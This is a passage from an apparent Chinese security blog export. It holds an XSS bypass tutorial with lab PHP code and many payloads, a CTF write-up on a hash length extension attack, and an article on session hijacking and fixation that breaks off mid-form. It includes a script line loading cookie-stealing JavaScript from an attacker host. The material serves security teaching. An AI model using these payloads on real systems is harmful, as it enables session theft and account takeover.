onfocus=alert(1)&gt;&lt;/select&gt; 通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发 &lt;select onfocus=alert(1) autofocus&gt; &lt;iframe&gt; &lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt; &lt;video&gt; &lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt; &lt;audio&gt; &lt;audio src=x onerror=alert(&quot;xss&quot;);&gt; &lt;body&gt; &lt;body/onload=alert(&quot;xss&quot;);&gt; 利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发 &lt;body onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt; &lt;textarea&gt; &lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt; &lt;keygen&gt; &lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐 &lt;marquee&gt; &lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; 补充 &lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt; XSS环境phpstudy Apache+PHP 5.4 0x00源码： &lt;!DOCTYPE html&gt; &lt;html lang=&quot;zh-CN&quot;&gt; &lt;body&gt; &lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt; &lt;?php ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_POST[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; echo &quot;&lt;input type=text value=&quot;.$ss.&quot;&gt;&quot;; ?&gt; 需要闭合前面的尖括号，才能解析。 http://127.0.0.1/xss.php?xss=&gt;&lt;script&gt;alert(&apos;a&apos;)&lt;/script&gt; 0x01源码： &lt;!DOCTYPE html&gt; &lt;html lang=&quot;zh-CN&quot;&gt; &lt;body&gt; &lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt; &lt;?php ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_GET[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; echo &quot;&lt;input type=text value=&apos;&quot;.$ss.&quot;&apos;&gt;&quot;; ?&gt; 这一关增加单引号，闭合前面的尖括号，并且闭合单引号，才能解析。 http://127.0.0.1/xss.php?xss=&apos;&gt;&lt;script&gt;alert(&apos;a&apos;)&lt;/script&gt; 0x02源码： &lt;!DOCTYPE html&gt; &lt;html lang=&quot;zh-CN&quot;&gt; &lt;body&gt; &lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt; &lt;?php ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_GET[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; echo &quot;&lt;input type=text value=&apos;&quot;.$ss.&quot;&apos;&gt;&quot;; ?&gt; 这一关增加单引号，闭合前面的尖括号，并且闭合单引号，才能解析。 http://127.0.0.1/xss.php?xss=&apos;&gt;&lt;script&gt;alert(&apos;a&apos;)&lt;/script&gt; 0x03源码： &lt;!DOCTYPE html&gt; &lt;html lang=&quot;zh-CN&quot;&gt; &lt;body&gt; &lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt; &lt;?php ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_GET[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; echo &quot;&lt;textarea&gt;$ss&lt;/textarea&gt;&quot;; ?&gt; 这一关需要闭合textarea标签。 http://127.0.0.1/xss.php?xss=&lt;/textarea&gt;&lt;script&gt;alert(&apos;a&apos;)&lt;/script&gt; 0x04源码： &lt;!DOCTYPE html&gt; &lt;html lang=&quot;zh-CN&quot;&gt; &lt;body&gt; &lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt; &lt;?php ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_GET[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; echo &quot;&lt;xmp&gt;$ss&lt;/xmp&gt;&quot;; ?&gt; 这一关需要闭合xmp标签，xmp标签会将标签内的任何代码不做任何处理的显示出来。 http://127.0.0.1/xss.php?xss=&lt;/xmp&gt;&lt;script&gt;alert(&apos;a&apos;)&lt;/script&gt; 0x05源码： &lt;!DOCTYPE html&gt; &lt;html lang=&quot;zh-CN&quot;&gt; &lt;body&gt; &lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt; &lt;div&gt; &lt;?php ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_GET[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; $ss=preg_replace(&quot;/&gt;/&quot;,&quot;&amp;gt&quot;,$ss); $ss=preg_replace(&quot;/&lt;/&quot;,&quot;&amp;lt&quot;,$ss); echo &apos;&lt;input type=&quot;text&quot; value=&quot;&apos;.$ss.&apos;&quot;&gt;&apos;; ?&gt; 这一关将尖括号进行了实体化，本打算使用js来进行实体编码，但是写了半天没写出来！php将就用吧。 通常情况下实体化基本可以防御所有xss，但是在特定情况下并不需要尖括号，通过autofocus属性去触发onfocus事件 http://127.0.0.1/xss.php?xss=&quot; autofocus onfocus=&quot;alert(&apos;a&apos;) 0x06源码： &lt;!DOCTYPE html&gt; &lt;html lang=&quot;zh-CN&quot;&gt; &lt;body&gt; &lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt; &lt;div&gt; &lt;?php ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_GET[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; $ss=preg_replace(&apos;/&quot;/&apos;,&quot;&amp;quot&quot;,$ss); echo &apos;&lt;iframe src=&quot;&apos;.$ss.&apos;&quot;&gt;&lt;/iframe&gt;&apos;; ?&gt; 这一关过滤了双引号，但是在双引号内可以利用javascript伪协议来加载script脚本。 http://127.0.0.1/xss.php?xss=javascript:alert(1) 0x07源码： &lt;?php ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_GET[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; $ss=preg_replace(&apos;/windows/&apos;,&quot;&quot;,$ss); $ss=preg_replace(&apos;/document/&apos;,&quot;&quot;,$ss); $ss=preg_replace(&apos;/img/&apos;,&quot;&quot;,$ss); $ss=preg_replace(&apos;/script/&apos;,&quot;&quot;,$ss); $ss=preg_replace(&apos;/&quot;/&apos;,&quot;&amp;quot&quot;,$ss); $ss=preg_replace(&apos;/onerror/&apos;,&quot;&quot;,$ss); echo &quot;&lt;textarea&gt;$ss&lt;/textarea&gt;&quot;; ?&gt; 这一关过滤了很多标签，双引号也被过滤了，假装该过滤的都过滤了，唯独svg没过滤。那就相当于什么都没过滤了。 http://127.0.0.1/xss.php?xss=&lt;/textarea&gt;&lt;svg onload=eval(atob(&apos;YWxlcnQoMSk=&apos;))&gt; 注释：onload 事件会在页面或图像加载完成后立即发生，eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码，atob解码base64。 闭合前面标签，再用svg标签，atob中的base64编码绕过一切过滤，只要svg没过滤。 0x08源码： header(&quot;Content-Security-Policy: script-src &apos;self&apos; &apos;unsafe-inline&apos;; frame-src &apos;self&apos;;&quot;); ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_GET[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; $ss=preg_replace(&apos;/windows/&apos;,&quot;&quot;,$ss); $ss=preg_replace(&apos;/document/&apos;,&quot;&quot;,$ss); $ss=preg_replace(&apos;/img/&apos;,&quot;&quot;,$ss); $ss=preg_replace(&apos;/script/&apos;,&quot;&quot;,$ss); $ss=preg_replace(&apos;/&quot;/&apos;,&quot;&amp;quot&quot;,$ss); echo &quot;&lt;textarea&gt;$ss&lt;/textarea&gt;&quot;; ?&gt; 这一关预加载绕过xss，参考文章第下面链接的第十二关，这关加了个csp内容安全策略。 CSP指的是内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。 CSP 以白名单的机制对网站加载或执行的资源起作用。在网页中，这样的策略通过 HTTP 头信息或者 meta 元素定义。CSP虽然提供了强大的安全保护，但是他也造成了如下问题：Eval及相关函数被禁用、内嵌的JavaScript代码将不会执行、只能通过白名单来加载远程脚本。 0x9源码： &lt;?php header(&quot;Content-Security-Policy: script-src &apos;self&apos; &apos;unsafe-inline&apos;; frame-src &apos;self&apos;;&quot;); ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_GET[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; $ss=preg_replace(&quot;/&apos;/&quot;,&quot;\&apos;&quot;,$ss); echo &quot;&lt;script&gt;console.log(&apos;&quot;.$ss.&quot;&apos;)&lt;/script&gt;&quot;; ?&gt; 这道题斜线被转义了，后面的括号和单引号用注释符（script中//注释）注释掉，前面单引号再加一个反斜线转义， http://127.0.0.1/xss.php?xss=1\&apos;);alert(1);// 0x10源码： &lt;?php #&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; img-src https://*; child-src &apos;none&apos;;&quot;&gt; header(&quot;Content-Security-Policy: script-src &apos;self&apos; &apos;unsafe-inline&apos;; frame-src &apos;self&apos;;&quot;); ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_GET[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; $ss=preg_replace(&quot;/script/&quot;,&quot;&quot;,$ss); echo &quot;&lt;textarea&gt;$ss&lt;/textarea&gt;&quot;; ?&gt; 这一关闭合标签，script过滤为空，双写绕过。 http://127.0.0.1/xss.php?xss=&lt;/textarea&gt;&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt; 0x11源码： &lt;?php ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_GET[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; header(&quot;X-XSS-Protection: 1; mode=block&quot;); $ss=preg_replace(&quot;/script/&quot;,&quot;&quot;,$ss); echo &quot;$ss&quot;; ?&gt; 过滤了script可以大小写绕过，但是多了一个header头X-XSS-Protection，这个头有三个值。分别为 0： 表示关闭浏览器的XSS防护机制 1：删除检测到的恶意代码， 如果响应报文中没有看到X-XSS-Protection 字段，那么浏览器就认为X-XSS-Protection配置为1，这是浏览器的默认设置 1; mode=block：如果检测到恶意代码，在不渲染恶意代码 script会被拦截，使用双写可以绕过，可能根据不同浏览器，火狐中这个请求头没作用，原文说要换大小写，无可厚非，这里不换大小写也可以。 http://127.0.0.1/xss.php?xss=&lt;ScrscriptiPt&gt;alert(&apos;a&apos;)&lt;/ScrscriptiPt&gt; 0x12源码： &lt;!DOCTYPE html&gt; &lt;html lang=&quot;zh-CN&quot;&gt; &lt;body&gt; &lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt; &lt;div&gt; &lt;?php ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_GET[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; if(strlen($ss)&gt;10) { $ss=substr(&quot;$ss&quot;,0,40); } #$ss=preg_replace(&quot;/script/&quot;,&quot;&quot;,$ss); echo &quot;$ss&quot;; ?&gt; 这一关长度被限制，可以尽力使用短的链接,网站可以根据IP转换十进制。 2544985753=127.0.0.1 http也不用输入，双斜线即可跳转新窗口。空格等被过滤用/替换。 http://127.0.0.1/xss.php?xss=&lt;svg/onload=window.open(&apos;//2544985753&apos;)&gt; 或者 http://127.0.0.1/xss.php?xss=&lt;svg/onload=eval(location.hash.slice(1))&gt;#alert(1) //注：#后面不算入长度 参考原文的第25关短出新高度。 0x13源码： &lt;?php ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_GET[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; $ss=preg_replace(&quot;/\./&quot;,&quot;&quot;,$ss); $ss=preg_replace(&quot;/\&apos;/&quot;,&quot;&quot;,$ss); $ss=preg_replace(&quot;/\&quot;/&quot;,&quot;&quot;,$ss); echo &quot;$ss&quot;; ?&gt; 过滤了单引号双引号和.。 按原文可以使用数组形式，.可以采用十进制来表示。引号使用反引号代替。 http://127.0.0.1/xss.php?xss=&lt;script&gt;window[&apos;open&apos;](&apos;http://2544985753&apos;)&lt;/script&gt; 过滤空格1.使用/替代空格 如：&lt;img/src=&apos;1&apos;/onerror=alert(&quot;xss&quot;);&gt; 2.大小写绕过，函数不能大小写 3.如果是正则替换匹配将script img 等置换为空，可采取双写绕过，如：scrscriptipt 4.eval字符拼接。 &lt;img src=&quot;x&quot; onerror=&quot;a=`aler`;b=`t`;c=&apos;(`xss`);&apos;;eval(a+b+c)&quot;&gt; 5.top拼接字符 &lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](`xss`);&lt;/script&gt; 6. 如果script没被禁止，可以写,只有script 标签里的src可以解析js其他的标签不可以。 &lt;script src=&quot;http://xx.xx.xx.xx/xss/myjs/cookie.js&quot;&gt;&lt;/script&gt; 实体化字符绕过，在浏览器中需要url编码 实体化字符，浏览器会自动截断#后面字符。 &lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt; Unicode编码绕过 &lt;img src=&quot;x&quot; onerror=&quot;eval(&apos;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029\u003b&apos;)&quot;&gt; url编码绕过 &lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&apos;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&apos;))&quot;&gt; #unescape对括号内进行解码 data协议 //xss常用 &lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt; #不url编码也可。 &lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt; #好用真好用。 Ascii码绕过 &lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt; hex绕过 &lt;img src=x onerror=eval(&apos;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&apos;)&gt; 八进制 &lt;img src=x onerror=alert(&apos;\170\163\163&apos;)&gt; base64绕过 &lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&apos;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&apos;))&quot;&gt; javascript: 协议 XSS &lt;a href=&quot;javascript:alert(`xss`);&quot;&gt;xss&lt;/a&gt; //需要点击 &lt;iframe src=javascript:alert(&apos;xss&apos;);&gt;&lt;/iframe&gt; //直接执行js 7.在js中利用反引号替代单引号双引号。如： &lt;img src=1 onerror=alert(`aa`)&gt; 8.过滤括号 &lt;svg/onload=&quot;window.onerror=eval;throw&apos;=alert\x281\x29&apos;;&quot;&gt; 9.html标签中用//可以代替http:// 10.十进制ip &lt;img src=&quot;x&quot; onerror=document.location=`http://2130706433/`&gt; 黑魔法svg xss&lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt; 可以执行xss攻击，但是&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;却不可以，为什么加&lt;svg&gt;可以执行， svg属于外部元素，外部元素来源于MathML和SVG命名空间。而mathml的定义如下。 那么相应的标签也遵循xml 和svgd的定义，在xml中 &amp;#40;会被解析成（，所以可以执行。 可以看考下原文， https://www.hackersb.cn/hacker/85.html 邮件格式XSS通常情况下邮件格式也会造成XSS，必须按照有效的电子地址才能填写成功， &quot;&lt;svg/onload=alert(1)&gt;&quot;@x.y 既符合格式也可以造成XSS， url的%0A绕过在实际情况中，在需要我们输入url的输入框中，对规则进行了检查，如果我们写javascript://是没法执行的，因为在JavaScript伪协议中，我们在双斜线后面使用JS代码，会payload无效， 也就是 &lt;iframe src=&quot;javascript://alert(1)&quot;&gt; 这个时候可以用换行符绕过。 &lt;iframe src=&quot;javascript://%250Aalert(1)&quot;&gt; &lt;iframe src=&quot;javascript://https://domain.com/%250A1?alert(1):0&quot;&gt; 绕过单双引号分号https://xz.aliyun.com/t/4010 参考：https://xz.aliyun.com/t/4414参考：https://www.hackersb.cn/hacker/85.html参考：https://xz.aliyun.com/t/4067参考：https://xz.aliyun.com/t/4074#toc-1]]></content>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[哈希长度拓展攻击]]></title>
    <url>%2F2019%2F03%2F03%2F%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[记录一道CTF题目，哈希长度拓展攻击，原理有点复杂，这里仅记录下用工具进行哈希长度拓展攻击。 题目地址：http://ctf5.shiyanbar.com/web/kzhan.php 首先先安装下工具。 安装hashpump先安装哈希长度拓展攻击的工具，很容易百度到， 使用hashpump哈希长度拓展工具。 crypto hashpump 部署哈希长度扩展攻击的工具 可以在python中运行也可以直接在kali中安装。 在linux安装步骤。 git clone https://github.com/bwall/HashPump apt-get install g++ libssl-dev cd HashPump make make install 安装的时候出了点小问题 记录一下。make命令显示 command not found， 没有安装，我用的是windows的kali拓展命令行，多少有些不足，就是没有make这个指令，更新源之后也没解决，最后百度到一条命令。 sudo apt-get install gcc automake autoconf libtool make ，总算安装上make命令了。但是g++没安装好出现了新的问题。 root@LAPTOP-J51H1TTH:/1/HashPump# make g++ -c -Wall main.cpp make: g++: Command not found make: *** [makefile:11: main.o] Error 127 直接安装下gcc ，apt-get update gcc python中的安装 pip install hashpumpy CTF题目 打开题目首先是这个画面，经过扫描，抓包信息收集完毕后发现在cookie参数中有source参数为0，改为1 常规出源码，事先知道是哈希长度拓展攻击，源码也很容易看懂。 源码如下 &lt;?php $flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;; $secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security! $username = $_POST[&quot;username&quot;]; $password = $_POST[&quot;password&quot;]; if (!empty($_COOKIE[&quot;getmein&quot;])) { if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) { if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) { echo &quot;Congratulations! You are a registered user.\n&quot;; die (&quot;The flag is &quot;. $flag); } else { die (&quot;Your cookies don&apos;t match up! STOP HACKING THIS SITE.&quot;); } } else { die (&quot;You are not an admin! LEAVE.&quot;); } } setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7)); if (empty($_COOKIE[&quot;source&quot;])) { setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7)); } else { if ($_COOKIE[&quot;source&quot;] != 0) { echo &quot;&quot;; // This source code is outputted here } } 第一步，在burp参数中加getmein，绕过第一层if。 第二层username=admin&amp;password=any 第三层就用到hash长度拓展攻击。 需要构造， if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) 但是$secret的变量不知道，只知道是长度为15的。并且burp抓包可看到且源码中给出。 知道 md5($secret . urldecode(“admin” . “admin”))=571580b26c65f306376d4f64e53cb5c7 hash长度拓展攻击前提要求。 如果这么一个情况，由两个字符串组成一个字符串($str=$a+$b)，第一个字符串($a)我不知道也不可控，只可控第二个字符串($b)，同时知道第一个字符串($a)的MD5值和长度，这时候我将第二个字符串精心构造一下，便可以算出合成的字符串$str的MD5的值。 简化一下要知道a+b的MD5值，首先要知道a的长度和MD5值，很简单的条件， 在这个题目中，secret+admin，长度为20，md5值则是$secret+adminadmin（md5($secret . urldecode(“admin” . “admin”))=571580b26c65f306376d4f64e53cb5c7），这里的等效签名为 secret+admin。所以需要加上admin所以才是给出的MD5。 root@LAPTOP-J51H1TTH:/1/HashPump# hashpump Input Signature: 571580b26c65f306376d4f64e53cb5c7 Input Data: admin Input Key Length: 20 Input Data to Add: a bedb98a49c228ff5e1211065cd4ae17f admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00a Input Data to Add: 随便写。 题目中需要urldecode，所以将\x变为% 得到flag。]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[session，cookie认证会话安全问题]]></title>
    <url>%2F2019%2F02%2F28%2F%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%8A%AB%E6%8C%81%2F</url>
    <content type="text"><![CDATA[转：先知社区 前言在互联网中，对于用户来说不仅仅是单向信息传输，更重要的是信息交互，但是在web中，http协议是无状态的，当一个请求等到了服务器的回应之后，两者连接便中断了，而第二个请求发出后，服务端并不知道你和第一个请求的关系，所以没办法持续保持身份信息，每个http请求对于服务器来说，如果没有身份认证，那么对服务器来说所有人的请求都是一样无区别的。所以在互联网中，在所有需要信息双向交互的地方就需要身份认证，对于不同的身份给予不同的权限，此时就用到会话这个概念。 为什么需要会话首先要理解tcp的三次握手，一般在TCP三次握手就创建了一个会话，在会话中可以传递信息，等TCP关闭连接就关闭会话了。HTTP协议是基于TCP协议的，所以http会话也是在TCP关闭连接后就关闭会话，而在http1.1中，一般一个连接就只能处理一个请求，所以在需要权限身份认证的时候就需要有一种凭证，才能使得每次请求服务器都知道是你，相当于建立了连续的会话，也就是每次的请求都带有自己的身份凭证。 简单点，会话就是让你在信息交互的时候让对方知道你是谁，并且一直知道你是谁，但是服务器不是人，没有自我辨别的功能，这时候需要一种凭证，也就是session。站在客户端角度，在你每次登录帐号密码之后，会有一串类似于短秘钥之类的东西，他只属于你，证明你的身份。站在服务器端，在php中，在你进行身份认证之后，会在服务器端保存一个以PHPSESSID为名的文件来储存你的身份，账号等各种信息，在用户每次提交带有session的请求时，自动去搜索这个以session命名的文件，查看里面的反序列化信息（也就是你的身份等信息）。 php中的session在上面我们提到了php中的session，那么一旦phpsessid泄露，相当于别人也可以使用你的身份，而且一般session在浏览器关闭后也不会注销，仅仅是你已经丢失了你的sessionid，但是服务端并未立刻失效。但是在php中并不是在登录之后才会给PHPSESSID，而是在 session_start(); 开始之后，http响应头部信息会返回 set-cookie:PHPSESSID=xxxxxxx,浏览器便会自动创建这个cookie，并且关联这个域名。同时，也在服务器端创建一个以Session ID命名的文件，此时你并没有登录，但是已经给了你相应的session，这时候带着账号密码去登录，登录成功后，Session ID才能匹配你的信息，否则不登录，在服务端创建的session文件内容为空，登录成功后，在服务端以你的phpsessid创建关于你信息的文件，当你带着这个phpsessid继续访问的时候，就会从服务端文件里查找关于你的信息，是否是管理员，还是普通用户，这属于后端代码编写不作讨论。 而在服务器端，会有一个sess_……………… 命名的文件保存用户信息。这里后台代码仅仅简单写了一个用户权限功能，实际上会记录更全面的用户信息，而里面的信息全部被序列化存储。 session劫持要明白session劫持，首先需要清楚session id的存储位置，sessionid不仅仅存储在cookie中，也可能存储在post get（很少见），或者由url重写来完成，还有一部分存储在隐藏域中，一般首选是存储在cookie中，当禁用了cookie传递之后就会重写在url里，在url里传递很容易暴露造成更多的安全问题，在允许cookie传递的时候首选cookie，在php中提供了session.use_only_cookies选项， session劫持实际上就是自己的PHPSESSID被攻击者以某种方式获取，然后在会话的有效期内，利用被攻击者的身份登录网站，来达到身份劫持，伪装成合法用户。一般PHPSESSID存储在cookie中，XSS攻击也会造成session劫持。 session成功劫持一般需要几个步骤， 1.用户访问的平台是使用session来进行身份认证。2.用户已经使用账号密码登录该平台，随即该用户会得到一个sessionid。3.通过劫持获取到sessionid，并且在sessionid的有效期内使用（未注销前）。 那么如何获得sessionid是关键，接下来会谈到，一般可以使用 1.劫持：XSS劫持，局域网嗅探，会话固定结合，任意文件读取漏洞等等。2.爆破：直接通过大流量爆破出sessionid（一般是不太可能)。3.得到session生成规则，并且得到签名通过计算获取。 规则爆破通过知道规则来进行爆破，不过这种方法基本上是没可能的局限性太多，且概率极小，php中的sessionid举例而言。生成规则如下。 PHPSESSID生成生成规则是根据hash_func散列来生成的，相关的参数有： 客户端IP 当前时间（秒） 当前时间（微秒） PHP自带的随机数生产器 秒微秒可以爆破，随机数也可能是伪随机，客户端IP也可以某种手段获取，但是四种同时精准获取，难度极大，但是不排除有成功的可能性。根据生成规则，也有可能爆破出，但是相对来说几乎不太可能。 利用XSS或者文件读取利用xss反弹到的cookie，来伪造身份登录。使用被攻击者的PHPSESSID，rv3kprfodknmqdrnf0cuial8r6 即可利用管理员的session来登录，前提是必须在会话有效期内使用。 或者利用任意文件读取，XXE等来进行读取文件名来获取sessionid，服务端保存的都是在有效期内的session。 会话固定劫持会话固定也属于劫持的一种，或者说他是通过攻击者诱导使用固定的sessionid。会话固定的流程主要为 1.攻击者通过构造url参数或者表单传递来固定sessionid。2.诱使用户使用攻击者构造的参数来登陆。3.在用户登录之后，攻击者直接使用自己之前构造的固定sessionid来登陆。 会话固定漏洞并不常见，并且在早期通常是使用url来传递sessionid，这样更极大方便了攻击者，因为只要简单构造一条url，并且对于用户是很正常的url，例如，www.taobao.com?sessionid=test123，在用户使用这条url去登陆的时候就会固定了sessionid，就可能造成会话固定劫持漏洞。重置sessionid可由如下。 1.通过xss漏洞，可以通过js设置cookie中的sessionid。document.cookie=”sessionid=test123”2.通过url传递，直接构造url–&gt;www.taobao.com?sessionid=test1233.使用Set-Cookie的HTTP响应头部设置Cookie。攻击者可以使用一些方法在Web服务器的响应中加入Set-Cookie的HTTP响应头部,通过自己的服务器页面绑定sessionid。 接下来我们通过一个简单的php认证来做一次会话固定劫持，后端对身份验证代码如下。 &lt;?php session_start();?&gt; if($_POST[&apos;zhanghao&apos;] == $username &amp;&amp; $_POST[&apos;mima&apos;] == $password) { $_SESSION[&quot;name&quot;]=$username; } if ($_SESSION[&apos;name&apos;] == &quot;&quot;) { echo &quot;&lt;script&gt;alert(&apos;对不起，你没有权限&apos;);location.href=&apos;index.php&apos;&lt;/script&gt;&quot;; } 此时攻击者构造一个表单页面。通过js来设置cookie造成会话固定攻击。此时使用户登陆。 &lt;html&gt; &lt;meta charset=&quot;utf-8&quot; content=&quot;text/html; charset=gb2312&quot;/&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState(&apos;&apos;, &apos;&apos;, &apos;/&apos;)&lt;/script&gt; &lt;form action=&quot;http://127.0.0.1/login.php&quot; method=&quot;POST&quot;&gt; 用户名称：&lt;input type=&quot;text&quot; 